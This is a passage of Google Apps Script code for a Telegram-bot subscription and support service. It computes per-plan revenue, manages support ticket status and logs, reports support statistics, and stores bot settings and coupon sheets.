      if (!sub.telegram_id) continue;

      stats.totalMembers++;
      if (stats[sub.status] !== undefined) stats[sub.status]++;
      stats.totalRevenue += sub.total_paid;

      // Members holding each plan right now. The MONEY per plan is counted
      // from the payment log below instead: total_paid is a member's lifetime
      // spend, so adding it here credited every rupee they ever paid to
      // whichever plan they happen to hold today. Someone who bought a sprint
      // pass and later an exam pass showed the whole amount under exam_pass
      // and nothing under sprint_30.
      if (sub.plan) {
        if (!stats.byPlan[sub.plan]) stats.byPlan[sub.plan] = { count: 0, revenue: 0, label: sub.plan_label };
        stats.byPlan[sub.plan].count++;
      }

      if (sub.status === 'active') {
        var expiry = parseIstDate(sub.expiry_date);
        if (expiry && expiry.getTime() <= weekAhead) stats.expiringIn7Days++;
      }
    }
  }

  var pay = book().getSheetByName(PAYMENT_SHEET);

  // Revenue per plan, from what was actually charged for each plan rather than
  // from what each member has spent in total. The log is the only place that
  // records which plan a given rupee was for.
  if (pay && pay.getLastRow() > 1) {
    var planCol = PAYMENT_HEADERS.indexOf('Plan');
    var amountCol = PAYMENT_HEADERS.indexOf('Amount');
    var all = pay.getRange(2, 1, pay.getLastRow() - 1, PAYMENT_HEADERS.length).getValues();
    for (var p = 0; p < all.length; p++) {
      var planId = String(all[p][planCol] || '').trim();
      if (!planId) continue;
      if (!stats.byPlan[planId]) stats.byPlan[planId] = { count: 0, revenue: 0, label: planId };
      stats.byPlan[planId].revenue += Number(all[p][amountCol]) || 0;
    }
  }

  // Recent payments give the dashboard a live activity feed.
  stats.recentPayments = [];
  if (pay && pay.getLastRow() > 1) {
    var take = Math.min(pay.getLastRow() - 1, 20);
    var rows = pay.getRange(pay.getLastRow() - take + 1, 1, take, PAYMENT_HEADERS.length).getValues();
    for (var r = rows.length - 1; r >= 0; r--) {
      stats.recentPayments.push({
        timestamp: String(rows[r][0] || ''),
        telegram_id: String(rows[r][1] || ''),
        username: String(rows[r][2] || ''),
        plan: String(rows[r][3] || ''),
        amount: Number(rows[r][4]) || 0,
        payment_id: String(rows[r][5] || ''),
        event: String(rows[r][6] || '')
      });
    }
  }

  return stats;
}

/**
 * findPaymentRecord — where a payment id appears in this sheet: the Payments
 * log (every payment ever) first, then the member rows (latest payment only).
 *
 * @returns {{telegram_id: string, source: string, plan: string, amount: number}|null}
 */
function findPaymentRecord(paymentId) {
  var target = String(paymentId || '').trim();
  if (!target) return null;

  var pay = book().getSheetByName(PAYMENT_SHEET);
  if (pay && pay.getLastRow() > 1) {
    var rows = pay.getRange(2, 1, pay.getLastRow() - 1, PAYMENT_HEADERS.length).getValues();
    var idCol = PAYMENT_HEADERS.indexOf('Payment ID');
    for (var i = 0; i < rows.length; i++) {
      if (String(rows[i][idCol] || '').trim() === target) {
        return {
          telegram_id: String(rows[i][1] || '').trim(),
          source: 'Payments',
          plan: String(rows[i][3] || ''),
          amount: Number(rows[i][4]) || 0
        };
      }
    }
  }

  var subs = book().getSheetByName(SUBSCRIBER_SHEET);
  if (subs && subs.getLastRow() > 1) {
    var values = subs.getRange(2, 1, subs.getLastRow() - 1, SUBSCRIBER_HEADERS.length).getValues();
    for (var j = 0; j < values.length; j++) {
      if (String(values[j][9] || '').trim() === target) {
        return {
          telegram_id: String(values[j][0] || '').trim(),
          source: 'Subscribers',
          plan: String(values[j][3] || ''),
          amount: Number(values[j][8]) || 0
        };
      }
    }
  }
  return null;
}

/** Creates the Subscribers and Payments tabs. Safe to run repeatedly. */
function setupSubscriptionSheets() {
  subscriberSheet();
  paymentSheet();
  book().toast('Subscribers and Payments tabs are ready.', 'Sadhana APPSC', 10);
}

// ============================================================================
// Support tickets & bot settings
// ============================================================================

/** Column widths for the Support tab. */
var SUPPORT_WIDTHS = [150, 170, 170, 120, 140, 170, 130, 110, 190, 320, 480, 180, 90, 170, 170, 180, 100, 180, 170, 170, 90, 150];

/** Returns the Support tab, creating it — or upgrading an older one — as needed. */
function supportSheet() {
  var ss = book();
  var sheet = ss.getSheetByName(SUPPORT_SHEET);
  if (!sheet) {
    sheet = ss.insertSheet(SUPPORT_SHEET);
    formatSimpleSheet(sheet, SUPPORT_HEADERS, SUPPORT_WIDTHS);
    applySupportFormatting(sheet);
  } else if (sheet.getLastColumn() < SUPPORT_HEADERS.length) {
    upgradeSupportSheet(sheet);
  }
  return sheet;
}

/**
 * upgradeSupportSheet — brings a Support tab from an earlier version up to
 * the current columns and statuses, keeping every row.
 *
 * "answered" becomes in_progress. Waiting On, Picked Up By and First Reply At
 * are filled from what the row already says, so the analysis counts old
 * tickets too.
 */
function upgradeSupportSheet(sheet) {
  var lastRow = sheet.getLastRow();
  if (lastRow > 1) {
    var width = SUPPORT_HEADERS.length;
    var values = sheet.getRange(2, 1, lastRow - 1, width).getValues();
    for (var i = 0; i < values.length; i++) {
      var row = values[i];
      while (row.length < width) row.push('');
      if (!String(row[0] || '').trim()) continue;
      var stored = String(row[7] || '').trim().toLowerCase();
      var status = normaliseTicketStatus(stored);
      row[7] = status;
      if (!String(row[16] || '').trim()) {
        row[16] = status === 'closed' ? '' : (stored === 'answered' ? 'student' : 'admin');
      }
      if (!String(row[17] || '').trim() && status !== 'open') row[17] = row[11] || '';
      if (!String(row[19] || '').trim() && Number(row[12]) > 0) row[19] = row[13] || '';
      if (row[20] === '' || row[20] === null) row[20] = 0;
    }
    sheet.getRange(2, 1, values.length, width).setValues(values);
  }
  formatSimpleSheet(sheet, SUPPORT_HEADERS, SUPPORT_WIDTHS);
  applySupportFormatting(sheet);
}

/** Colours Status and Waiting On, and explains what the values mean. */
function applySupportFormatting(sheet) {
  var rows = Math.max(sheet.getMaxRows() - 1, 1);
  var statusRange = sheet.getRange(2, 8, rows, 1);   // H
  var waitingRange = sheet.getRange(2, 17, rows, 1); // Q

  function rule(range, text, bg, fg) {
    return SpreadsheetApp.newConditionalFormatRule()
      .whenTextEqualTo(text).setBackground(bg).setFontColor(fg)
      .setRanges([range]).build();
  }
  sheet.setConditionalFormatRules([
    rule(statusRange, 'open', '#ffe0b2', '#e65100'),
    rule(statusRange, 'in_progress', '#bbdefb', '#0d47a1'),
    rule(statusRange, 'closed', '#c8e6c9', '#1b5e20'),
    rule(waitingRange, 'admin', '#ffcdd2', '#b71c1c'),
    rule(waitingRange, 'student', '#eceff1', '#455a64')
  ]);
  sheet.getRange(1, 8).setNote(
    'open = ' + STATUS_MEANINGS.open + '\n' +
    'in_progress = ' + STATUS_MEANINGS.in_progress + '\n' +
    'closed = ' + STATUS_MEANINGS.closed + '\n\n' +
    'Only an admin can close a ticket.'
  );
  sheet.getRange(1, 17).setNote(
    'admin = the student wrote last and is waiting for an admin (needs reply)\n' +
    'student = an admin wrote last; waiting for the student\n' +
    'blank = closed'
  );
}

/** Returns the Support Log tab, creating it if absent. */
function supportLogSheet() {
  var ss = book();
  var sheet = ss.getSheetByName(SUPPORT_LOG_SHEET);
  if (!sheet) {
    sheet = ss.insertSheet(SUPPORT_LOG_SHEET);
    formatSimpleSheet(sheet, SUPPORT_LOG_HEADERS, [180, 150, 120, 200, 80, 180, 420, 110]);
  }
  return sheet;
}

/** Returns the Bot Settings tab, creating it if absent. */
function botSettingsSheet() {
  var ss = book();
  var sheet = ss.getSheetByName(BOT_SETTINGS_SHEET);
  if (!sheet) {
    sheet = ss.insertSheet(BOT_SETTINGS_SHEET);
    formatSimpleSheet(sheet, BOT_SETTINGS_HEADERS, [200, 520, 170, 220]);
  }
  return sheet;
}

/** Turns a Support row into an object. */
function rowToTicket(row, rowNumber) {
  var status = normaliseTicketStatus(row[7]);
  var waiting = String(row[16] || '').trim().toLowerCase();
  if (status === 'closed') {
    waiting = '';
  } else if (waiting !== 'admin' && waiting !== 'student') {
    waiting = String(row[7] || '').trim().toLowerCase() === 'answered' ? 'student' : 'admin';
  }
  return {
    ticket_id: String(row[0] || '').trim(),
    created_at: String(row[1] || '').trim(),
    updated_at: String(row[2] || '').trim(),
    telegram_id: String(row[3] || '').trim(),
    username: String(row[4] || '').trim(),
    name: String(row[5] || '').trim(),
    category: String(row[6] || '').trim(),
    status: status,
    bot: String(row[8] || '').trim(),
    last_message: String(row[9] || ''),
    conversation: String(row[10] || ''),
    handled_by: String(row[11] || '').trim(),
    admin_replies: Number(row[12]) || 0,
    last_admin_reply_at: String(row[13] || '').trim(),
    closed_at: String(row[14] || '').trim(),
    closed_by: String(row[15] || '').trim(),
    waiting_on: waiting,
    picked_up_by: String(row[17] || '').trim(),
    picked_up_at: String(row[18] || '').trim(),
    first_reply_at: String(row[19] || '').trim(),
    times_reopened: Number(row[20]) || 0,
    group: String(row[21] || '').trim(),
    row_number: rowNumber
  };
}

/** Reads one ticket row by number. */
function readTicketRow(sheet, rowNumber) {
  return rowToTicket(sheet.getRange(rowNumber, 1, 1, SUPPORT_HEADERS.length).getValues()[0], rowNumber);
}

/** 1-based row of a ticket, or -1. */
function findTicketRow(sheet, ticketId) {
  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return -1;
  var target = String(ticketId).trim();
  var ids = sheet.getRange(2, 1, lastRow - 1, 1).getValues();
  for (var i = 0; i < ids.length; i++) {
    if (String(ids[i][0] || '').trim() === target) return i + 2;
  }
  return -1;
}

/** One "[time] who: text" block for the Conversation column. */
function conversationEntry(author, text) {
  return '[' + istNow() + '] ' + String(author || 'unknown') + ':\n' + String(text || '');
}

/** Appends to a thread, dropping the oldest part when the cell would overflow. */
function appendToConversation(existing, entry) {
  var joined = existing ? existing + '\n\n' + entry : entry;
  if (joined.length > MAX_CONVERSATION_CHARS) {
    joined = '…(older messages trimmed)\n' + joined.slice(joined.length - MAX_CONVERSATION_CHARS);
  }
  return joined;
}

/**
 * writeSupportLog — one row in the Support Log. Callers already hold the
 * script lock; this never takes it.
 */
function writeSupportLog(ticketId, telegramId, who, role, action, details, statusAfter) {
  supportLogSheet().appendRow([
    istNow(),
    String(ticketId || ''),
    String(telegramId || ''),
    safeCell(String(who || '')),
    String(role || ''),
    String(action || ''),
    safeCell(String(details || '').slice(0, 2000)),
    String(statusAfter || '')
  ]);
}

/** Column numbers, so the rules below read as what they change. */
var COL = {
  updatedAt: 3, status: 8, lastMessage: 10, conversation: 11, handledBy: 12, adminReplies: 13,
  lastAdminReplyAt: 14, closedAt: 15, closedBy: 16, waitingOn: 17, pickedUpBy: 18, pickedUpAt: 19,
  firstReplyAt: 20, timesReopened: 21, group: 22
};

/**
 * pickUp — the first admin action on an open ticket moves it to in_progress
 * and records who picked it up. Returns the status afterwards.
 */
function pickUp(sheet, rowNumber, ticket, who, now) {
  if (ticket.status !== 'open') return ticket.status;
  sheet.getRange(rowNumber, COL.status).setValue('in_progress');
  sheet.getRange(rowNumber, COL.pickedUpBy).setValue(safeCell(String(who || '')));
  sheet.getRange(rowNumber, COL.pickedUpAt).setValue(now);
  writeSupportLog(ticket.ticket_id, ticket.telegram_id, who, 'admin', 'picked_up',
    'First admin action on this ticket', 'in_progress');
  return 'in_progress';
}

/** Moves a closed ticket back to in_progress. Returns the status afterwards. */
function reopen(sheet, rowNumber, ticket, who, role, reason) {
  sheet.getRange(rowNumber, COL.status).setValue('in_progress');
  sheet.getRange(rowNumber, COL.closedAt).setValue('');
  sheet.getRange(rowNumber, COL.closedBy).setValue('');
  sheet.getRange(rowNumber, COL.timesReopened).setValue(ticket.times_reopened + 1);
  writeSupportLog(ticket.ticket_id, ticket.telegram_id, who, role, 'reopened', reason, 'in_progress');
  return 'in_progress';
}

/**
 * createTicket — records a new ticket.
 *
 * A student's ticket starts open and waiting on an admin. A conversation an
 * admin starts (/msg) is already in_progress and waiting on the student.
 * The id is minted by the bot, so a retried delivery returns the existing row.
 *
 * @param {Object} data ticket_id, telegram_id, username, name, category, bot, message, [opened_by], [group]
 * @returns {Object} The stored ticket
 */
function createTicket(data) {
  return withScriptLock(function () {
    var sheet = supportSheet();
    var ticketId = String(data.ticket_id).trim();
    var existingRow = findTicketRow(sheet, ticketId);
    if (existingRow !== -1) return readTicketRow(sheet, existingRow);

    var now = istNow();
    var message = String(data.message || '');
    var author = data.username ? '@' + data.username : String(data.name || data.telegram_id);
    var openedBy = String(data.opened_by || '');
    var row = [
      ticketId,
      now,
      now,
      String(data.telegram_id).trim(),
      safeCell(String(data.username || '')),
      safeCell(String(data.name || '')),
      String(data.category || 'other'),
      openedBy ? 'in_progress' : 'open',
      String(data.bot || ''),
      safeCell(message),
      appendToConversation('', conversationEntry(openedBy ? 'Admin ' + openedBy : author, message)),
      safeCell(openedBy),
      openedBy ? 1 : 0,
      openedBy ? now : '',
      '',
      '',
      openedBy ? 'student' : 'admin',
      safeCell(openedBy),
      openedBy ? now : '',
      openedBy ? now : '',
      0,
      safeCell(String(data.group || ''))
    ];
    sheet.appendRow(row);
    var rowNumber = sheet.getLastRow();
    writeSupportLog(ticketId, data.telegram_id, openedBy || author, openedBy ? 'admin' : 'student',
      openedBy ? 'admin_started_conversation' : 'ticket_opened',
      '[' + String(data.category || 'other') + '] ' + message, row[7]);
    // Read back rather than returning `row`: safeCell's apostrophes are in the
    // array but not in what the sheet stores.
    return readTicketRow(sheet, rowNumber);
  });
}

/**
 * appendTicketMessage — adds one message to a ticket's thread and applies the
 * lifecycle rules:
 *
 *   admin message  — open → in_progress (picked up); closed → in_progress
 *                    (reopened); waiting on the student
 *   student message — open stays open; in_progress stays; closed →
 *                    in_progress (reopened); waiting on an admin
 *
 * Nothing but an explicit close (setTicketStatus) ever closes a ticket.
 *
 * @param {string} ticketId
 * @param {string} author Who wrote it, as it should read in the thread
 * @param {string} text
 * @param {string} [status] Ignored; kept so older callers keep working
 * @param {string} [handledBy] The admin, when an admin wrote it
 * @param {string} [logAction] What to call it in the Support Log
 * @returns {Object|null} The updated ticket, or null when it does not exist
 */
function appendTicketMessage(ticketId, author, text, status, handledBy, logAction) {
  return withScriptLock(function () {
    var sheet = supportSheet();
    var rowNumber = findTicketRow(sheet, ticketId);
    if (rowNumber === -1) return null;

    var ticket = readTicketRow(sheet, rowNumber);
    var isAdmin = Boolean(handledBy);
    var who = isAdmin ? handledBy : author;
    var role = isAdmin ? 'admin' : 'student';
    var now = istNow();
    var current = ticket.status;

    if (current === 'closed') {
      current = reopen(sheet, rowNumber, ticket, who, role,
        isAdmin ? 'An admin wrote to the student on a closed ticket' : 'The student wrote again');
    } else if (isAdmin) {
      current = pickUp(sheet, rowNumber, ticket, who, now);
    }

    sheet.getRange(rowNumber, COL.updatedAt).setValue(now);
    sheet.getRange(rowNumber, COL.lastMessage).setValue(safeCell(String(text)));
    sheet.getRange(rowNumber, COL.conversation).setValue(
      appendToConversation(ticket.conversation, conversationEntry(author, text)));
    sheet.getRange(rowNumber, COL.waitingOn).setValue(isAdmin ? 'student' : 'admin');
    if (isAdmin) {
      sheet.getRange(rowNumber, COL.handledBy).setValue(safeCell(String(handledBy)));
      sheet.getRange(rowNumber, COL.adminReplies).setValue(ticket.admin_replies + 1);
      sheet.getRange(rowNumber, COL.lastAdminReplyAt).setValue(now);
      if (!ticket.first_reply_at) sheet.getRange(rowNumber, COL.firstReplyAt).setValue(now);
    }

    writeSupportLog(ticketId, ticket.telegram_id, who, role,
      logAction || (isAdmin ? 'admin_reply' : 'student_message'), text, current);

    var updated = readTicketRow(sheet, rowNumber);
    updated.reopened = ticket.status === 'closed';
    return updated;
  });
}

/**
 * setTicketStatus — an admin closing or reopening a ticket.
 *
 * closed is only ever reached here. Asking for open or in_progress on a
 * closed ticket reopens it as in_progress; on an open one it picks it up.
 *
 * @returns {Object|null} The ticket, or null when it does not exist
 */
function setTicketStatus(ticketId, status, handledBy) {
  var requested = String(status || '').trim().toLowerCase();
  if (requested === 'answered' || requested === 'reopen') requested = 'in_progress';
  if (TICKET_STATUSES.indexOf(requested) === -1) {
    throw new Error('Status must be one of: ' + TICKET_STATUSES.join(', '));
  }
  return withScriptLock(function () {
    var sheet = supportSheet();
    var rowNumber = findTicketRow(sheet, ticketId);
    if (rowNumber === -1) return null;

    var ticket = readTicketRow(sheet, rowNumber);
    var who = String(handledBy || '');
    var now = istNow();
    // Callers use previous_status to tell the student only about a real change.
    ticket.previous_status = ticket.status;

    if (requested === 'closed') {
      if (ticket.status === 'closed') return ticket;
      sheet.getRange(rowNumber, COL.status).setValue('closed');
      sheet.getRange(rowNumber, COL.waitingOn).setValue('');
      sheet.getRange(rowNumber, COL.closedAt).setValue(now);
      sheet.getRange(rowNumber, COL.closedBy).setValue(safeCell(who));
      if (!ticket.picked_up_by) {
        sheet.getRange(rowNumber, COL.pickedUpBy).setValue(safeCell(who));
        sheet.getRange(rowNumber, COL.pickedUpAt).setValue(now);
      }
      writeSupportLog(ticketId, ticket.telegram_id, who, 'admin', 'closed', ticket.status + ' → closed', 'closed');
    } else if (ticket.status === 'closed') {
      reopen(sheet, rowNumber, ticket, who, 'admin', 'Reopened by an admin');
      sheet.getRange(rowNumber, COL.waitingOn).setValue('admin');
    } else if (ticket.status === 'open') {
      pickUp(sheet, rowNumber, ticket, who, now);
    } else {
      return ticket;
    }

    sheet.getRange(rowNumber, COL.updatedAt).setValue(now);
    if (who) sheet.getRange(rowNumber, COL.handledBy).setValue(safeCell(who));
    var updated = readTicketRow(sheet, rowNumber);
    updated.previous_status = ticket.previous_status;
    return updated;
  });
}

/**
 * logTicketEvent — something an admin did that is not a message to the
 * student (checking a payment, an invite that could not be sent). It picks an
 * open ticket up, and never changes who the ticket is waiting on.
 *
 * @returns {Object|null} The ticket, or null when it does not exist
 */
function logTicketEvent(ticketId, who, role, action, details) {
  return withScriptLock(function () {
    var sheet = supportSheet();
    var rowNumber = findTicketRow(sheet, ticketId);
    if (rowNumber === -1) return null;
    var ticket = readTicketRow(sheet, rowNumber);
    var now = istNow();
    var status = ticket.status;
    if (role === 'admin' && who) {
      status = pickUp(sheet, rowNumber, ticket, who, now);
      sheet.getRange(rowNumber, COL.handledBy).setValue(safeCell(String(who)));
    }
    sheet.getRange(rowNumber, COL.updatedAt).setValue(now);
    writeSupportLog(ticketId, ticket.telegram_id, who, role, action, details, status);
    return readTicketRow(sheet, rowNumber);
  });
}

/**
 * setTicketGroup — records which group a ticket is about, when the student
 * did not say or picked the wrong one. The bot checks the id is one of its
 * groups before calling this.
 *
 * @returns {Object|null} The ticket, or null when it does not exist
 */
function setTicketGroup(ticketId, group, handledBy) {
  return withScriptLock(function () {
    var sheet = supportSheet();
    var rowNumber = findTicketRow(sheet, ticketId);
    if (rowNumber === -1) return null;
    var ticket = readTicketRow(sheet, rowNumber);
    var value = String(group || '').replace(/[^a-z0-9_]/gi, '').slice(0, 40);
    if (value === ticket.group) return ticket;
    sheet.getRange(rowNumber, COL.group).setValue(value);
    sheet.getRange(rowNumber, COL.updatedAt).setValue(istNow());
    writeSupportLog(ticketId, ticket.telegram_id, handledBy || '', 'admin', 'group_changed',
      (ticket.group || 'not specified') + ' → ' + (value || 'not specified'), ticket.status);
    return readTicketRow(sheet, rowNumber);
  });
}

/** Support Log rows for one ticket, oldest first, at most the newest 200. */
function ticketLog(ticketId) {
  var ss = book();
  var sheet = ss.getSheetByName(SUPPORT_LOG_SHEET);
  if (!sheet || sheet.getLastRow() <= 1) return [];
  var values = sheet.getRange(2, 1, sheet.getLastRow() - 1, SUPPORT_LOG_HEADERS.length).getValues();
  var target = String(ticketId).trim();
  var out = [];
  for (var i = 0; i < values.length; i++) {
    if (String(values[i][1] || '').trim() !== target) continue;
    out.push({
      at: String(values[i][0] || ''),
      who: String(values[i][3] || ''),
      role: String(values[i][4] || ''),
      action: String(values[i][5] || ''),
      details: String(values[i][6] || ''),
      status_after: normaliseTicketStatus(values[i][7])
    });
  }
  return out.slice(-200);
}

/** One ticket by id with its activity log, or null. */
function getTicket(ticketId) {
  var sheet = supportSheet();
  var rowNumber = findTicketRow(sheet, ticketId);
  if (rowNumber === -1) return null;
  var ticket = readTicketRow(sheet, rowNumber);
  ticket.log = ticketLog(ticketId);
  return ticket;
}

/** Empty per-status counts, including the "who acts next" queues. */
function emptyTicketCounts() {
  return { open: 0, in_progress: 0, closed: 0, total: 0, needs_reply: 0, waiting_student: 0 };
}

/**
 * listTickets — tickets with per-status counts.
 *
 * @param {Object} params status, waitingOn (admin | student; never closed),
 *   search, telegramId, sort ('waiting' = longest waiting first), page, pageSize
 */
function listTickets(params) {
  var sheet = supportSheet();
  var lastRow = sheet.getLastRow();
  var counts = emptyTicketCounts();
  if (lastRow <= 1) return { total: 0, page: 1, pageSize: 0, totalPages: 1, counts: counts, tickets: [] };

  var values = sheet.getRange(2, 1, lastRow - 1, SUPPORT_HEADERS.length).getValues();
  var rawStatus = String(params.status || '').trim().toLowerCase();
  var statusFilter = rawStatus ? normaliseTicketStatus(rawStatus) : '';
  var waitingFilter = String(params.waitingOn || '').trim().toLowerCase();
  var search = String(params.search || '').trim().toLowerCase();
  var telegramId = String(params.telegramId || '').trim();
  var groupFilter = String(params.group || '').trim();
  var page = clampInt(params.page, 1, 1, 100000);
  var pageSize = clampInt(params.pageSize, 50, 1, 200);

  var matched = [];
  for (var i = values.length - 1; i >= 0; i--) {
    var ticket = rowToTicket(values[i], i + 2);
    if (!ticket.ticket_id) continue;
    counts.total++;
    counts[ticket.status]++;
    if (ticket.waiting_on === 'admin') counts.needs_reply++;
    if (ticket.waiting_on === 'student') counts.waiting_student++;

    if (statusFilter && ticket.status !== statusFilter) continue;
    if (waitingFilter && ticket.waiting_on !== waitingFilter) continue;
    if (telegramId && ticket.telegram_id !== telegramId) continue;
    if (groupFilter && ticket.group !== groupFilter) continue;
    if (search) {
      var haystack = (ticket.ticket_id + ' ' + ticket.telegram_id + ' ' + ticket.username + ' ' +
        ticket.name + ' ' + ticket.group + ' ' + ticket.last_message).toLowerCase();
      if (haystack.indexOf(search) === -1) continue;
    }
    // The list never carries whole threads; getTicket does.
    ticket.conversation = '';
    matched.push(ticket);
  }

  if (String(params.sort || '') === 'waiting') {
    matched.sort(function (a, b) {
      var at = parseIstDate(a.updated_at);
      var bt = parseIstDate(b.updated_at);
      return (at ? at.getTime() : 0) - (bt ? bt.getTime() : 0);
    });
  }

  var start = (page - 1) * pageSize;
  return {
    total: matched.length,
    page: page,
    pageSize: pageSize,
    totalPages: Math.max(1, Math.ceil(matched.length / pageSize)),
    counts: counts,
    tickets: matched.slice(start, start + pageSize)
  };
}

/** Minutes between two IST stamps, or null when either cannot be read. */
function minutesBetween(fromStamp, toStamp) {
  var from = parseIstDate(fromStamp);
  var to = parseIstDate(toStamp);
  if (!from || !to) return null;
  return Math.max(0, Math.round((to.getTime() - from.getTime()) / 60000));
}

/** Middle value of a list of numbers, or null. */
function median(numbers) {
  if (!numbers.length) return null;
  var sorted = numbers.slice().sort(function (a, b) { return a - b; });
  var mid = Math.floor(sorted.length / 2);
  return sorted.length % 2 ? sorted[mid] : Math.round((sorted[mid - 1] + sorted[mid]) / 2);
}

/**
 * getSupportStats — the numbers behind the Support dashboard's analysis.
 *
 * @param {Object} params days: the period for "in the last N days" figures (default 30)
 */
function getSupportStats(params) {
  var days = clampInt(params && params.days, 30, 1, 365);
  var now = Date.now();
  var since = now - days * 24 * 60 * 60 * 1000;
  var today = Utilities.formatDate(new Date(), 'Asia/Kolkata', 'dd-MM-yyyy');

  var stats = {
    period_days: days,
    counts: emptyTicketCounts(),
    opened_today: 0,
    closed_today: 0,
    opened_in_period: 0,
    closed_in_period: 0,
    first_reply_minutes: { average: null, median: null, samples: 0 },
    close_hours: { average: null, median: null, samples: 0 },
    oldest_needs_reply: null,
    not_picked_up: 0,
    by_category: {},
    by_group: {},
    by_admin: {}
  };

  var sheet = supportSheet();
  var lastRow = sheet.getLastRow();
  var firstReplies = [];
  var closeTimes = [];

  if (lastRow > 1) {
    var values = sheet.getRange(2, 1, lastRow - 1, SUPPORT_HEADERS.length).getValues();
    for (var i = 0; i < values.length; i++) {
      var t = rowToTicket(values[i], i + 2);
      if (!t.ticket_id) continue;
      stats.counts.total++;
      stats.counts[t.status]++;
      if (t.status === 'open') stats.not_picked_up++;

      var category = t.category || 'other';
      if (!stats.by_category[category]) {
        stats.by_category[category] = { open: 0, in_progress: 0, closed: 0, total: 0 };
      }
      stats.by_category[category][t.status]++;
      stats.by_category[category].total++;

      var groupKey = t.group || 'unspecified';
      if (!stats.by_group[groupKey]) {
        stats.by_group[groupKey] = { open: 0, in_progress: 0, closed: 0, needs_reply: 0, total: 0 };
      }
      stats.by_group[groupKey][t.status]++;
      stats.by_group[groupKey].total++;
      if (t.waiting_on === 'admin') stats.by_group[groupKey].needs_reply++;

      if (t.waiting_on === 'admin') {
        stats.counts.needs_reply++;
        var waitingSince = parseIstDate(t.updated_at);
        if (waitingSince && (!stats.oldest_needs_reply || waitingSince.getTime() < stats.oldest_needs_reply.since_ms)) {
          stats.oldest_needs_reply = {
            ticket_id: t.ticket_id,
            name: t.name || (t.username ? '@' + t.username : t.telegram_id),
            category: category,
            group: t.group,
            since: t.updated_at,
            since_ms: waitingSince.getTime(),
            minutes: Math.max(0, Math.round((now - waitingSince.getTime()) / 60000))
          };
        }
      }
      if (t.waiting_on === 'student') stats.counts.waiting_student++;

      if (t.created_at.indexOf(today) === 0) stats.opened_today++;
      if (t.closed_at.indexOf(today) === 0) stats.closed_today++;

      var created = parseIstDate(t.created_at);
      if (created && created.getTime() >= since) {
        stats.opened_in_period++;
        if (t.first_reply_at) {
          var reply = minutesBetween(t.created_at, t.first_reply_at);
          if (reply !== null) firstReplies.push(reply);
        }
      }
      var closed = t.closed_at ? parseIstDate(t.closed_at) : null;
      if (closed && closed.getTime() >= since) {
        stats.closed_in_period++;
        var open = minutesBetween(t.created_at, t.closed_at);
        if (open !== null) closeTimes.push(open / 60);
      }
    }
  }

  function summary(list, digits) {
    if (!list.length) return { average: null, median: null, samples: 0 };
    var sum = 0;
    for (var k = 0; k < list.length; k++) sum += list[k];
    var factor = Math.pow(10, digits);
    return {
      average: Math.round((sum / list.length) * factor) / factor,
      median: Math.round(median(list) * factor) / factor,
      samples: list.length
    };
  }
  stats.first_reply_minutes = summary(firstReplies, 0);
  stats.close_hours = summary(closeTimes, 1);

  // What each admin did in the period, from the log.
  var log = book().getSheetByName(SUPPORT_LOG_SHEET);
  if (log && log.getLastRow() > 1) {
    var rows = log.getRange(2, 1, log.getLastRow() - 1, SUPPORT_LOG_HEADERS.length).getValues();
    for (var r = 0; r < rows.length; r++) {
      if (String(rows[r][4] || '') !== 'admin') continue;
      var at = parseIstDate(rows[r][0]);
      if (!at || at.getTime() < since) continue;
      var who = String(rows[r][3] || '').trim() || 'unknown';
      var action = String(rows[r][5] || '');
      if (!stats.by_admin[who]) {
        stats.by_admin[who] = { replies: 0, quick_replies: 0, picked_up: 0, closed: 0, invites_sent: 0,
          payments_checked: 0, passes_granted: 0, last_action_at: '' };
      }
      var entry = stats.by_admin[who];
      if (action === 'admin_reply' || action === 'admin_started_conversation') entry.replies++;
      else if (action.indexOf('quick_reply:') === 0) entry.quick_replies++;
      else if (action === 'picked_up') entry.picked_up++;
      else if (action === 'closed') entry.closed++;
      else if (action === 'invite_sent') entry.invites_sent++;
      else if (action === 'payment_checked') entry.payments_checked++;
      else if (action === 'pass_granted') entry.passes_granted++;
      entry.last_action_at = String(rows[r][0] || '');
    }
  }

  if (stats.oldest_needs_reply) delete stats.oldest_needs_reply.since_ms;
  return stats;
}

/** Every stored bot setting as { key: value }. Unknown keys are the caller's to ignore. */
function getBotSettings() {
  var sheet = botSettingsSheet();
  var lastRow = sheet.getLastRow();
  var out = {};
  if (lastRow <= 1) return out;
  var values = sheet.getRange(2, 1, lastRow - 1, 2).getValues();
  for (var i = 0; i < values.length; i++) {
    var key = String(values[i][0] || '').trim();
    if (key) out[key] = String(values[i][1] === null || values[i][1] === undefined ? '' : values[i][1]);
  }
  return out;
}

/**
 * updateBotSettings — writes the given keys, leaving all others alone.
 *
 * Which keys exist is decided by the server (src/support.js); this only
 * refuses shapes that could never be a setting.
 *
 * @param {Object} settings { key: value }
 * @param {string} updatedBy
 * @returns {Object} Every stored setting after the write
 */
function updateBotSettings(settings, updatedBy) {
  return withScriptLock(function () {
    var sheet = botSettingsSheet();
    var now = istNow();
    Object.keys(settings).forEach(function (rawKey) {
      var key = String(rawKey).trim();
      if (!/^[a-z0-9_]{1,40}$/.test(key)) throw new Error('Invalid setting key: ' + key);
      var value = String(settings[rawKey] === null || settings[rawKey] === undefined ? '' : settings[rawKey]).slice(0, 4000);

      var lastRow = sheet.getLastRow();
      var rowNumber = -1;
      if (lastRow > 1) {
        var keys = sheet.getRange(2, 1, lastRow - 1, 1).getValues();
        for (var i = 0; i < keys.length; i++) {
          if (String(keys[i][0] || '').trim() === key) { rowNumber = i + 2; break; }
        }
      }
      // Stored as text, so "199" stays a string and a date is never reformatted.
      var row = [key, "'" + value, now, String(updatedBy || '')];
      if (!value) row[1] = '';
      if (rowNumber === -1) {
        sheet.appendRow(row);
      } else {
        sheet.getRange(rowNumber, 1, 1, row.length).setValues([row]);
      }
    });
    return getBotSettings();
  });
}

// ============================================================================
// Coupons
// ============================================================================

/** Returns the Coupons tab, creating it if absent. */
function couponSheet() {
  var ss = book();
  var sheet = ss.getSheetByName(COUPON_SHEET);
  if (!sheet) {
    sheet = ss.insertSheet(COUPON_SHEET);
    formatSimpleSheet(sheet, COUPON_HEADERS, [140, 110, 110, 70, 110, 90, 90, 130, 260, 200, 170, 200, 170]);
  }
  return sheet;
}

/** Returns the Coupon Redemptions tab, creating it if absent. */
function redemptionSheet() {
  var ss = book();
  var sheet = ss.getSheetByName(REDEMPTION_SHEET);
  if (!sheet) {
    sheet = ss.insertSheet(REDEMPTION_SHEET);
    formatSimpleSheet(sheet, REDEMPTION_HEADERS, [180, 140, 120, 140, 180, 120, 100, 110, 200]);
  }
  return sheet;
}

